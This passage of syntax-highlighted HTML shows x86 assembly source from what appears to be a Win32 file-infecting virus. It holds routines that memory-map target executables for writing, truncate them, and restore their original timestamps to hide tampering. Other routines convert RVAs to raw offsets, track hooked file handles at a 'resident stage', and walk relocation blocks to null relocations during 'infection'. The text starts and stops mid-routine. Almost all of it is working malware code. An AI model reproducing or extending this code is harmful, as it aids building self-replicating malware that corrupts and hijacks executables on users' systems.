                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc9">.if</span><span class="sc0">     !</span><span class="sc10">zero?</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;FILE_MAP_WRITE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">.endif</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddMapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;map view of file</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;push base adress of memory-maped file</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;jump to return adress leavin parameterz in the stack</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;close and unmap file previosly opened in read only mode</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFileAdj</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;close and unmap file previosly opened in read/write mode</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;unmap view of file</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc0">       </span><span class="sc1">;if read-only mode, jump</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFilePointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;move file pointer to the real end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetEndOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;truncate file at real end of file</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore original date/time stamp field</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close handle</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_ebp2_Uni2Ansi</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;this function sets EBP register to reference internal</span><span class="sc0">
                        </span><span class="sc1">;  variablez correctly and also converts unicode</span><span class="sc0">
                        </span><span class="sc1">;  strings to ansi (for unicode version APIz only).</span><span class="sc0">
                        </span><span class="sc1">;this function is only useful at the resident stage.</span><span class="sc0">
                        </span><span class="sc1">;on entry:</span><span class="sc0">
                        </span><span class="sc1">;  TOS+28h (Pshd.cPushad.Arg1): pointer to specified file name</span><span class="sc0">
                        </span><span class="sc1">;on exit:</span><span class="sc0">
                        </span><span class="sc1">;  ECX = 0, if error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get source pointer to specified file name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_ebp2</span><span class="sc0">                        </span><span class="sc1">;get actual EBP</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get target pointer to internal buffer</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ansiok</span><span class="sc0">

</span><span class="sc5">Uni2Ansi</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;this function converts an ansi string to a unicode string</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  ESI = pointer to specified file name</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  ECX = 0, if error</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;NULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;NULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;target pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;source pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;CP_ACP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddWideCharToMultiByte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">ansiok</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Rva2Raw</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;this function converts RVA valuez to RAW pointerz inside PE</span><span class="sc0">
                </span><span class="sc1">;  filez. This function is specialy useful for memory-maped</span><span class="sc0">
                </span><span class="sc1">;  filez.</span><span class="sc0">
                </span><span class="sc1">;given a RVA value, this function returns the start adress</span><span class="sc0">
                </span><span class="sc1">;  and size of the section containin it, plus its relative</span><span class="sc0">
                </span><span class="sc1">;  delta value inside the section.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EAX = RVA value</span><span class="sc0">
                </span><span class="sc1">;  EBP = start of memory-maped file (MZ header)</span><span class="sc0">
                </span><span class="sc1">;  ESI = start of PE header + 3Ch</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EBP = RAW size of section</span><span class="sc0">
                </span><span class="sc1">;  EBX = RAW start of section</span><span class="sc0">
                </span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">
                </span><span class="sc1">;        start of respective section header (+ section header</span><span class="sc0">
                </span><span class="sc1">;        size), if found</span><span class="sc0">
                </span><span class="sc1">;  EDX = RVA start of section</span><span class="sc0">
                </span><span class="sc1">;  ESI = relative delta of RVA value inside section.</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0">         \ </span><span class="sc1">;get number of sectionz</span><span class="sc0">
                                 </span><span class="sc5">.FH_NumberOfSections</span><span class="sc0">   \
                                 </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Rva2Raw</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0">         \ </span><span class="sc1">;get first section header</span><span class="sc0">
                          </span><span class="sc5">.FH_SizeOfOptionalHeader</span><span class="sc0">      \
                          </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">

</span><span class="sc5">match_virtual</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;scan each PE section header and determine if specified RVA</span><span class="sc0">
                </span><span class="sc1">;value points inside</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;is RVA value pointin inside current section?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">section_found</span><span class="sc0">                   </span><span class="sc1">;yea we found the section, jump</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">match_virtual</span><span class="sc0">                   </span><span class="sc1">;nope, get next section</span><span class="sc0">

</span><span class="sc5">end_Rva2Raw</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Rva2Raw</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_handle_ofs_ebp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;this function sets EBP register to reference internal</span><span class="sc0">
                        </span><span class="sc1">;  variablez correctly and also given a handle, it gets</span><span class="sc0">
                        </span><span class="sc1">;  a pointer to an entry in the handlez table.</span><span class="sc0">
                        </span><span class="sc1">;this function is only useful at the resident stage.</span><span class="sc0">
                        </span><span class="sc1">;on entry:</span><span class="sc0">
                        </span><span class="sc1">;  TOS+28h (Pshd.cPushad.Arg1): specified handle</span><span class="sc0">
                        </span><span class="sc1">;on exit:</span><span class="sc0">
                        </span><span class="sc1">;  EDI = pointer to entry in handlez table</span><span class="sc0">
                        </span><span class="sc1">;  Carry clear, if ok</span><span class="sc0">
                        </span><span class="sc1">;  Carry set, if error</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_gho_stc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_ebp2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get handle</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_gho_stc</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">get_handle_ofs_0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;gets a pointer to an empty entry in the handlez table</span><span class="sc0">
                    </span><span class="sc1">;this function is only useful at the resident stage.</span><span class="sc0">
                    </span><span class="sc1">;on exit:</span><span class="sc0">
                    </span><span class="sc1">;  EDI = pointer to entry in handlez table</span><span class="sc0">
                    </span><span class="sc1">;  Carry clear, if ok</span><span class="sc0">
                    </span><span class="sc1">;  Carry set, if error</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">get_handle_ofs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;given a handle, this function gets a pointer</span><span class="sc0">
                </span><span class="sc1">;  to an entry in the handlez table.</span><span class="sc0">
                </span><span class="sc1">;this function is only useful at the resident stage.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EAX = specified handle</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EDI = pointer to entry in handlez table</span><span class="sc0">
                </span><span class="sc1">;  Carry clear, if ok</span><span class="sc0">
                </span><span class="sc1">;  Carry set, if error</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Handlez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nHANDLEZ</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">next_gho</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">                           </span><span class="sc1">;add edi,8</span><span class="sc0">
                </span><span class="sc6">scasd</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;top of handlez table reached?</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_gho</span><span class="sc0">         </span><span class="sc1">;yea, handle not found, jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;do handlez match?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_gho</span><span class="sc0">        </span><span class="sc1">;no, check next handle, jump</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">;yea, handle found, clear carry</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">end_gho_stc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;set carry</span><span class="sc0">
       </span><span class="sc5">end_gho</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">section_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get RAW start of section</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">ecx.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get RAW size of section</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_relocs</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;this comon funtion is called from both instalation and</span><span class="sc0">
                </span><span class="sc1">;  infection stage.</span><span class="sc0">
                </span><span class="sc1">;it simply locates each relocation block in the .reloc section</span><span class="sc0">
                </span><span class="sc1">;  and calls a function to (a) nulify those dangerous reloca-</span><span class="sc0">
                </span><span class="sc1">;  tionz in a block (infection stage) or (b) to fix the code</span><span class="sc0">
                </span><span class="sc1">;  pointed to by such marked relocationz (instalation stage).</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EDI = RVA start pointer to chunk of code</span><span class="sc0">
                </span><span class="sc1">;  TOS+04h (Arg1): fix_relocs label function adress (instalation stage)</span><span class="sc0">
                </span><span class="sc1">;                    or</span><span class="sc0">
                </span><span class="sc1">;                  nul_relocs label function adress (infection stage)</span><span class="sc0">
                </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;get start of relocation section in aplication context</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;get end adress of chunk code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get end of relocation section in aplication context</span><span class="sc0">

</span><span class="sc5">process_reloc_blocks</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get start RVA for this block of relocationz</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get end RVA where relocationz can point in a block</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;get size of reloc block</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_BASE_RELOCATION</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;RVA pointer inside relocation block? (check low boundary)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get next block adress</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">next_reloc_block</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">;RVA pointer inside relocation block? (check high boundary)</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">next_reloc_block</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;get number of relocationz for this block</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">next_reloc_block</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;call fix_relocs function or nul_relocs function</span><span class="sc0">

</span><span class="sc5">next_reloc_block</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;get next block adress</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;end of relocation blockz?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">process_reloc_blocks</span><span class="sc0">    </span><span class="sc1">;no, process the block, jump</span><span class="sc0">
